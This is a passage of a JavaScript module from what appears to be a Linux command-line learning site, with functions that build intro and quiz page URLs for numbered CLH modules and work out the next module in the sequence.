     * @param {string} moduleId - Current module ID (e.g., 'CLH-002')
     * @returns {object} { url: string, isLast: boolean, nextModuleId: string|null }
     */
    function getNextIntroUrl(moduleId) {
        const nextModuleId = getNextModule(moduleId);

        if (!nextModuleId) {
            // This is the last module - return to Script House
            return {
                url: '../../index.html',
                isLast: true,
                nextModuleId: null
            };
        }

        // Extract the number from CLH-XXX format
        const match = nextModuleId.match(/CLH-(\d+)/i);
        if (!match) {
            return {
                url: '../../index.html',
                isLast: true,
                nextModuleId: null
            };
        }

        const nextNum = match[1]; // e.g., '003'

        // From lab (applets/linux/), intro is at ../../clh/script-clh-XXX-intro.applet.html
        return {
            url: `../../clh/script-clh-${nextNum}-intro.applet.html`,
            isLast: false,
            nextModuleId: nextModuleId
        };
    }

    /**
     * Get the URL to the current module's intro page
     * @param {string} moduleId - Module ID (e.g., 'CLH-002')
     * @returns {string} URL to intro page
     */
    function getIntroUrl(moduleId) {
        const match = moduleId.match(/CLH-(\d+)/i);
        if (!match) return '../../clh/script-clh-001-intro.applet.html';
        return `../../clh/script-clh-${match[1]}-intro.applet.html`;
    }

    /**
     * Get the URL to the current module's quiz page
     * @param {string} moduleId - Module ID (e.g., 'CLH-002')
     * @returns {string} URL to quiz page
     */
    function getQuizUrl(moduleId) {
        const match = moduleId.match(/CLH-(\d+)/i);
        if (!match) return '../../clh/script-clh-001.quiz.html';
        return `../../clh/script-clh-${match[1]}.quiz.html`;
    }

    // ═══════════════════════════════════════════════════════════════
    // EXPOSE PUBLIC API
    // ═══════════════════════════════════════════════════════════════

    return {
        getModule,
        getAllModuleIds,
        getModulesByTier,
        getTier,
        getAllTiers,
        isValidModule,
        getNextModule,
        getPreviousModule,
        getNextIntroUrl,
        getIntroUrl,
        getQuizUrl,

        // Expose constants for debugging
        _MODULES: MODULES,
        _TIERS: TIERS,
    };

})();
